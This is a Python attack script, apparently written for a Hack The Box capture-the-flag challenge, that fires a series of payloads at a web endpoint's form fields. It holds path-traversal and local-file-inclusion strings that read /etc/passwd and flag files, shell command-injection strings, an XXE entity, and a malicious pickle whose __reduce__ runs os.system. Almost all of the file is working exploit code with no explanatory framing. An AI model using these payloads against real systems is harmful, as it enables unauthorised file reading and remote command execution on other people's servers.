#!/usr/bin/env python3
import requests
import struct
import time
import re

base_url = 'http://94.237.53.81:59575'

# INNOVACIÓN 102: LFI (Local File Inclusion)
print("[*] INNOVACIÓN 102: LFI attempts")
s = requests.Session()
s.get(base_url)

lfi_payloads = [
    '../flag.txt',
    '../../flag.txt',
    '../../../flag.txt',
    '../../../../flag.txt',
    '../../../../../../../etc/passwd',
    '/etc/passwd',
    'file:///flag.txt',
    '....//....//....//flag.txt',
]

for payload in lfi_payloads:
    r = s.post(f'{base_url}/transmit', data={
        'freq': payload,
        'mod': 'ASK',
        'bits': '1',
        'msg': 'TEST'
    })
    if 'root:' in r.text or 'HTB{' in r.text or ('flag' in r.text.lower() and 'Not Found' not in r.text):
        print(f"[+] Possible LFI with {payload}:")
        print(r.text[:500])

# INNOVACIÓN 103: RCE via command injection en msg parameter
print("\n[*] INNOVACIÓN 103: RCE in msg parameter")
s = requests.Session()
s.get(base_url)

rce_payloads = [
    '$(cat /flag.txt)',
    '`cat /flag.txt`',
    '; cat /flag.txt #',
    '| cat /flag.txt',
    '$(ls -la /)',
]

for payload in rce_payloads:
    r = s.post(f'{base_url}/transmit', data={
        'freq': '433.92',
        'mod': 'ASK',
        'bits': '1',
        'msg': payload
    })
    if 'flag' in r.text.lower() or 'HTB{' in r.text or 'root' in r.text:
        print(f"[+] Possible RCE with {payload}:")
        print(r.text[:500])

# INNOVACIÓN 104: XXE (XML External Entity)
print("\n[*] INNOVACIÓN 104: XXE")
xxe_payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
<data>&xxe;</data>'''

r = s.post(f'{base_url}/transmit', data={
    'freq': '433.92',
    'mod': 'ASK',
    'bits': '1',
    'msg': xxe_payload
})

if 'HTB{' in r.text or 'flag' in r.text.lower():
    print(f"[+] Possible XXE:")
    print(r.text[:500])

# INNOVACIÓN 105: Deserialización insegura
print("\n[*] INNOVACIÓN 105: Python pickle/deserialization")
import pickle
import base64

# Crear pickle malicioso
class Exploit:
    def __reduce__(self):
        import os
        return (os.system, ('cat /flag.txt',))

try:
    pickled = pickle.dumps(Exploit())
    pickled_b64 = base64.b64encode(pickled).decode()
    
    r = s.post(f'{base_url}/transmit', data={
        'freq': '433.92',
        'mod': 'ASK',
        'bits': '1',
        'msg': pickled_b64
    })
    
    if 'HTB{' in r.text:
        print('[SUCCESS]', re.findall(r'HTB\{[^}]+\}', r.text))
except:
    print("[-] Pickle attack failed")

print("\n[*] Innovaciones 102-105 completadas")
